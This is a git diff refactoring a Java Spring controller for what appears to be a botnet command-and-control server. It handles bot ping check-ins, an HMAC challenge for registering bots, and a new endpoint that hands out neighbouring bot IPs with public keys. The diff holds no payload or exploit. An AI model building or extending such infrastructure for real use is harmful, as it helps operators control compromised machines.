@@ -1,6 +1,7 @@
 package cs.sii.controller;
 
 import java.io.IOException;
+import java.security.PublicKey;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
@@ -22,11 +23,14 @@ import org.springframework.web.servlet.ModelAndView;
 import cs.sii.bot.action.Auth;
 import cs.sii.bot.action.Behavior;
 import cs.sii.config.onLoad.Config;
+import cs.sii.control.command.Commando;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
+import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
 import cs.sii.model.bot.BotRepository;
 import cs.sii.service.connection.NetworkService;
+import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.dao.BotServiceImpl;
 import cs.sii.service.dao.RoleServiceImpl;
 
@@ -37,44 +41,22 @@ public class CommandController {
 	@Autowired
 	private Config configEngine;
 
-	@Autowired
-	private Auth auth;
 
 	@Autowired
-	private BotServiceImpl botService;
-
-	@Autowired
-	private NetworkService networkService;
-
-	// Controller che intercetta i ping dei bot
-	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
+	private Commando cmm;
+	
+	
+	
+	
+	@RequestMapping(value = "/Neighbours", method = RequestMethod.POST)
 	@ResponseBody
-	public String BotPing(HttpServletResponse error) throws IOException {
-		String response = "";
-		if (configEngine.isCommandandconquerStatus()) {
-			response = "ping";
-		} else {
-			error.sendError(HttpStatus.SC_NOT_FOUND);
-		}
-		return response;
-
+	public SyncIpList<IP, PublicKey> getNeighbours(@RequestBody String data, HttpServletResponse error) throws IOException {
+		return cmm.getNeighbours(data);
 	}
-	// TODO
-	// @RequestMapping(value = "/BotNet", method = RequestMethod.GET)
-	// @ResponseBody
-	// public List<IP> getAllBotNet(HttpServletResponse error) throws
-	// IOException {
-	// List<IP> response = new ArrayList<IP>();
-	//
-	// if (engineBot.isCommandandconquerStatus()) {
-	// response = networkService.getBotIps().getIPList();
-	// } else {
-	// error.sendError(HttpStatus.SC_NOT_FOUND);
-	// }
-	// return response;
-	// }
-
+	
 	// CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////
+
+
 
 	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
 	@ResponseBody
@@ -82,10 +64,7 @@ public class CommandController {
 		System.out.println("1");
 		Pairs<Long, Integer> response = new Pairs<>();
 		if (configEngine.isCommandandconquerStatus()) {
-			Long keyNumber = new Long(auth.generateNumberText());
-			Integer iterationNumber = new Integer(auth.generateIterationNumber());
-			auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
-			response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
+			response = cmm.authReq(idBot);
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
@@ -99,26 +78,9 @@ public class CommandController {
 	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
 			HttpServletRequest request) throws IOException {
 		String response = "";
-		String idBot = objects.get(0).toString();
-		String hashMac=objects.get(7).toString();
-		
-		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
-		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
-		
-		
 		if (configEngine.isCommandandconquerStatus()) {
-			if (auth.findBotChallengeInfo(idBot)) {
+			response = cmm.checkHmac(objects);
 
-		
-				if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
-					response = "Challenge OK";
-					//botRepository.save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(),objects.get(3).toString(), objects.get(2).toString()));
-					Bot bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(), objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),objects.get(6).toString());
-					botService.getBotRepository().save(bot);
-					//TODO DA decidere send some peers
-				}else
-				response = "Challenge con HMAC non valido";
-			}
 		} else {
 			response = "Challenge Error";
 			error.sendError(HttpStatus.SC_NOT_FOUND);
@@ -135,9 +97,18 @@ public class CommandController {
 		return "";
 	}
 
-	// @RequestMapping(value = "/list", method = RequestMethod.GET)
-	// public String list() {
-	// return "userCommand";
-	// }
-	//
+	// Controller che intercetta i ping dei bot
+	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
+	@ResponseBody
+	public String BotPing(HttpServletResponse error) throws IOException {
+		String response = "";
+		if (configEngine.isCommandandconquerStatus()) {
+			response = "ping";
+		} else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return response;
+
+	}
+
 }
